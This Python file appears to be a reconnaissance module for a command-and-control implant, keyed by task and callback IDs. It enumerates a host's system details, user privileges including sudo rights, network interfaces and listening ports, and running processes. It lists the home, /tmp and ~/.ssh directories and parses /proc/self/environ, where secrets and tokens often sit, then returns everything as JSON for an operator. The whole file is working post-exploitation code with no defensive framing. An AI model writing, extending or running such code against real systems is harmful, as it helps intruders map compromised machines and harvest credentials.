import subprocess
import json
import time
import os


def run_cmd(cmd):
    """
    Safely execute a command and return structured output.
    """
    try:
        output = subprocess.check_output(
            cmd,
            stderr=subprocess.STDOUT,
            timeout=5
        )
        return {
            "success": True,
            "output": output.decode(errors="ignore").strip()
        }
    except subprocess.TimeoutExpired:
        return {
            "success": False,
            "error": "timeout"
        }
    except Exception as e:
        return {
            "success": False,
            "error": str(e)
        }


def parse_environ(result):
    """
    Convert /proc/self/environ output into a dictionary.
    """
    if not result.get("success"):
        return result

    env = {}
    raw = result.get("output", "")

    for item in raw.split("\x00"):
        if "=" in item:
            k, v = item.split("=", 1)
            env[k] = v

    return {
        "success": True,
        "variables": env
    }


def execute(params, task_id, callback_id):
    start_time = time.time()

    mode = params.strip().lower() if params else "quick"

    home_dir = os.path.expanduser("~")

    data = {}

    # System info
    data["system"] = {
        "hostname": run_cmd(["hostname"]),
        "os": run_cmd(["uname", "-a"]),
        "kernel": run_cmd(["uname", "-r"]),
        "uptime": run_cmd(["uptime", "-p"]),
    }

    # User context
    uid_result = run_cmd(["id", "-u"])
    is_root = False
    if uid_result.get("success") and uid_result.get("output") == "0":
        is_root = True

    data["user"] = {
        "current": run_cmd(["whoami"]),
        "id": run_cmd(["id"]),
        "groups": run_cmd(["id", "-Gn"]),
        "is_root": is_root,
        "sudo": run_cmd(["sudo", "-n", "-l"])  # non-interactive
    }

    # Network info
    data["network"] = {
        "interfaces": run_cmd(["ip", "a"]),
        "routes": run_cmd(["ip", "route"]),
        "listening_ports": run_cmd(["ss", "-tulnp"])
    }

    # Processes
    data["processes"] = {
        "top_memory": run_cmd(["ps", "aux", "--sort=-%mem"])
    }

    # Files
    data["files"] = {
        "home": run_cmd(["ls", "-la", home_dir]),
        "tmp": run_cmd(["ls", "-la", "/tmp"]),
    }
    
    ssh_dir = os.path.join(home_dir, ".ssh")
    if not os.path.exists(ssh_dir):
        ssh_dir = None

    # Secrets (light touch)
    data["secrets"] = {
    "ssh_keys": run_cmd(["ls", "-la", ssh_dir]) if ssh_dir else {"success": False, "error": "no .ssh directory"}
    }

    # Proc data
    env_raw = run_cmd(["cat", "/proc/self/environ"])
    data["procdata"] = {
        "environ": parse_environ(env_raw),
        "cmdline": run_cmd(["cat", "/proc/self/cmdline"]),
    }

    # Optional deeper enumeration
    if mode == "full":
        data["files"]["etc"] = run_cmd(["ls", "-la", "/etc"])
        data["system"]["mounts"] = run_cmd(["mount"])

    # Metadata
    data["meta"] = {
        "task_id": task_id,
        "callback_id": callback_id,
        "mode": mode,
        "execution_time_seconds": round(time.time() - start_time, 2)
    }

    return json.dumps(data, indent=2)
